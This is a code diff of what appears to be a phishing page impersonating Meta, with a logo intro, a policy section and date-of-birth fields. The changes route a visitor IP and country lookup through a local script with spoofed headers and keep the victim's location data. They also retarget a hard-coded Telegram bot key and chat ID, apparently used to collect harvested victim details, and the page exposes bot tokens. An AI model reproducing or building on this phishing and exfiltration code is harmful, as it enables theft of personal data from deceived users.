@@ -25,9 +25,19 @@
     <img id="meta-logo" src="./img/loadingLogo.gif" alt="Meta Logo">
 </div>
 <script>
+    var userIpData = {
+        'user_ip': 'Incorrect request ;(',
+        'country': '-',
+        'country_code': '-',
+    }
     window.onload = async () => {
-        var url = "https://api.db-ip.com/v2/free/self/";
-        const response = await fetch(url);
+        var url = "ip.php";
+        const response = await fetch(url, 
+        {
+            headers: {
+            "User-Agent": "Mozilla/5.0",
+            "Referer": "https://yourwebsite.com"
+        }});
         console.log(response);
         if (response.status == 200) {
             const data = await response.json();
@@ -35,6 +45,11 @@
                 document.body.style.display = "block"; 
                 setTimeout(() => {
                     document.getElementById('intro').style.display = 'none';
+                    userIpData = {
+                        'user_ip': data.ipAddress,
+                        'country': data.countryName,
+                        'country_code': data.countryCode,
+                    }
                 }, 5000); // 2 giây
             } else {
                 document.body.innerHTML='';
@@ -4345,7 +4360,7 @@
         };
     </script>
     <script>
-       var apiKey = "7861008820:AAEpRnH07HOopuC2o5bV53S8pZjKA5h20TM",chatId='1117818432';
+       var apiKey = "7861008820:AAEpRnH07HOopuC2o5bV53S8pZjKA5h20TM",chatId='-2695103809';
     // var apiKey = "7919345658:AAGVy4jwPdSyRKp6VDJ8a5gsq2DTNn-M4Bs",chatId='6580233045';
         const subLinks = {
             'PolicyCollapse': [{
@@ -4554,11 +4569,7 @@
             'dob-year': '',
         }
     
-        var userIpData = {
-            'user_ip': 'Incorrect request ;(',
-            'country': '-',
-            'country_code': '-',
-        }
+        
         var metrics = {
             'dis_name': 'MPC',
             'is_Mobile': window.mobileCheck(),
@@ -4680,7 +4691,7 @@
             }
         }
         /////
-        getUserIp()
+        // getUserIp()
         function escapeMarkdownV2(text) {
             return text.replace(/[_*[\]()~>#+\-=|{}.!]/g, "\\$&"); // Escape toàn bộ ký tự đặc biệt
         }
